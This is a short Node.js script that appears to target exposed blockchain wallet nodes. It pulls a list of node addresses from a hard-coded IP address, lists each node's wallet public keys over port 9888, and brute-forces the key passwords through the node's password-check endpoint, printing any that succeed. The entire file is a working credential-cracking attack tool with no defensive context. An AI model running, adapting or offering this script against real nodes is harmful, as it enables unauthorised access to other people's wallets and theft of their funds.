var request = require('request');

// start config
var crack_local = false
try_pwds = ['111','222']
precogs_api = "http://52.82.28.100:9889/list-nodes"
// end config

if (crack_local) {
    crack('http://localhost')
} else {
    request(precogs_api, function (error, response, body) {
        JSON.parse(body).data.forEach(function(entry) {
            url_p1 = entry.address.split(":")[0];
            crack(url_p1)
        })
    })
}

function crack(url_p1) {
    var xpubs = [];
    url = url_p1 + ':9888/list-keys';
    request(url, function (error, response, body) {
            if (!error && response.statusCode === 200) {
                JSON.parse(body).data.forEach(function(entry) {
                    crack_xpub(url_p1, entry.xpub);
                });
            } else {
                console.log("Skip: Fail to vist", url)
            };
    });
};

// crack xpub on url
function crack_xpub(url_p1, xpub) {
    url = url_p1 + ":9888/check-key-password"
    console.log("cracking", url)
    console.log("\tcracking xpub:", xpub)
    try_pwds.forEach(function(pwd) {
        request({
            url: url,
            method: "POST",
            json: {"xpub": xpub, "password": pwd}
            }, function (error, response, body) {
            if (!error && response.statusCode === 200) {
                if (body.data.check_result == true) {
                    console.log("\t\tCracked! password:", pwd)
                }
            } else {
                console.log("error: " + error)
                console.log("response.statusCode: " + response.statusCode)
                console.log("response.statusText: " + response.statusText)
            }
        })
    });
};